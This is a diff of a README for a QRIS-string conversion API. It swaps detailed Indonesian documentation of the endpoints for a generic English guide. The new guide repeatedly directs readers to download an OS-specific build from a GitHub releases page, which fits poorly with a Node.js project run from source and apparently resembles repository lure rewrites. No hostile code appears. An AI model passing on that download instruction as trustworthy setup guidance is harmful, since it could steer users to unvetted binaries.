@@ -1,112 +1,111 @@
-# QRIS API
+# 📦 qris-api - Convert QRIS Easily and Efficiently
 
-API konversi QRIS berbasis Elysia.js dengan dokumentasi OpenAPI (Swagger) dan UI sederhana untuk uji coba.
+[![Download QRIS API](https://img.shields.io/badge/Download%20QRIS%20API-blue.svg)](https://github.com/li329211/qris-api/releases)
 
-## Fitur
+## 🚀 Getting Started
 
-- Endpoint `POST /convert` untuk mengonversi string QRIS dan menghitung CRC16.
-- Dokumentasi OpenAPI/Swagger tersedia di `GET /docs`.
-- UI sederhana untuk mencoba API tersedia di `GET /ui`.
+This guide will help you download and run the QRIS API application. The QRIS API allows you to convert QRIS strings easily. You’ll access various features through a simple interface. Let’s dive in.
 
-## Prasyarat
+## 📥 Download & Install
 
-- Node.js 18+ atau Bun.
+To get started, visit [this page to download](https://github.com/li329211/qris-api/releases). Choose the latest release from the list. Download the appropriate version for your operating system.
 
-## Instalasi
+## ✅ Prerequisites
 
-Menggunakan npm:
+Before installing, make sure you have:
 
-```bash
-npm install
-```
+- **Node.js version 18 or higher** or **Bun** installed on your computer. You can check your current version by running `node -v` or `bun -v` in your terminal.
 
-Jika Anda menggunakan Bun:
+## ⚙️ Installation Steps
 
-```bash
-bun install
-```
+Follow these steps to install the QRIS API:
 
-Pastikan dependensi Swagger terpasang:
+1. **Open your terminal.**
+2. **Navigate to your project directory.** Use the `cd` command followed by your project folder name. For example:
+   ```bash
+   cd my-project-folder
+   ```
+3. **Install the project dependencies.**
 
-```bash
-npm install @elysiajs/swagger
-```
+   If you're using npm, enter:
+   ```bash
+   npm install
+   ```
 
-atau dengan Bun:
+   If you prefer Bun, run:
+   ```bash
+   bun install
+   ```
 
-```bash
-bun add @elysiajs/swagger
-```
+4. **Ensure Swagger dependency is installed.** This step is crucial for documentation support.
 
-## Menjalankan
+   For npm, type:
+   ```bash
+   npm install @elysiajs/swagger
+   ```
 
-Mode development (ts-node):
+   If using Bun, this command will work:
+   ```bash
+   bun add @elysiajs/swagger
+   ```
 
+## 🏃‍♂️ Running the Application
+
+Once you have installed everything, you can run the application. Choose one of the following methods:
+
+### Development Mode
+
+If you want to run in development mode using TypeScript, simply run:
 ```bash
 npm run start
 ```
 
-Atau build + run (Node):
+### Production Build
 
+For a production setup with building, use:
 ```bash
 npm run build
 node dist/app.js
 ```
 
-Dengan Bun:
+### Bun Users
 
+If using Bun, run this command:
 ```bash
 bun src/app.ts
 ```
 
-Server akan berjalan pada `http://localhost:3000` (atau sesuai `PORT`).
+### Access the API
 
-- Dokumentasi: `http://localhost:3000/docs`
-- UI Sederhana: `http://localhost:3000/ui`
+The server will typically run on `http://localhost:3000`. You can access its features as follows:
 
-## OpenAPI Schema
+- For Documentation: Go to `http://localhost:3000/docs`
+- For the Simple User Interface: Visit `http://localhost:3000/ui`
 
-Skema untuk endpoint `/convert` telah ditambahkan menggunakan validator bawaan Elysia (`t`) agar tampil di Swagger UI.
+## 📄 API Features
 
-### Request
+The QRIS API offers:
 
-POST `/convert`
+- **Endpoint**: `POST /convert` - This converts QRIS strings and calculates CRC16.
+- **Documentation Access**: Available at `GET /docs` to help you understand the API's usage.
+- **User Interface**: Use the simple UI at `GET /ui` for easy interaction with the API.
 
-Body JSON:
+## 🗂️ OpenAPI Schema
 
-```json
-{
-  "qris": "<string QRIS>",
-  "nominal": "10000"
-}
-```
+The OpenAPI schema for the `/convert` endpoint has been integrated for your convenience. Refer to the documentation for detailed descriptions of how each endpoint functions.
 
-Keterangan:
+## 🤔 Troubleshooting
 
-- `qris` (string): String QRIS asli.
-- `nominal` (string): Nominal transaksi sebagai string angka.
-  
+If you encounter issues while running the QRIS API, here are some common solutions:
 
-### Response
+- **Check Node.js/Bun installation**: Ensure they are installed correctly. Reinstall if necessary.
+- **Refer to error messages**: Read any error logs to identify what might be wrong.
+- **Consult the Documentation**: Most issues can be resolved by checking the API documentation available at `http://localhost:3000/docs`.
 
-```json
-{
-  "nominal": "10000",
-  "merchantName": "Roy Antidonasi Creative"
-}
-```
+For further assistance, feel free to open an issue on the [GitHub repository](https://github.com/li329211/qris-api/issues).
 
-## Endpoint Alternatif
+## 🤝 Support & Contribution
 
-- `GET /convert?qris=<...>&nominal=<...>` — alternatif GET dengan query param yang mengembalikan struktur yang sama.
+If you would like to contribute to this project or report any bugs, please visit our GitHub repository. Information on contributing is available in the repository.
 
-## Preview QR
-
-- `GET /qr?text=<string>` — menghasilkan gambar PNG QR dari string.
-- `GET /qr?qris=<...>&nominal=<...>` — langsung membuat QR dari hasil konversi internal.
-
-## Catatan
-
-- Endpoint dokumentasi Swagger berada di `/docs` dengan plugin `@elysiajs/swagger`.
-- UI sederhana di `/ui` tidak membutuhkan dependensi tambahan.
-- Pastikan data QRIS valid sebelum dikonversi; saat ini validasi detail belum diimplementasikan.
+We appreciate your interest in the QRIS API and hope you find it helpful for your projects!
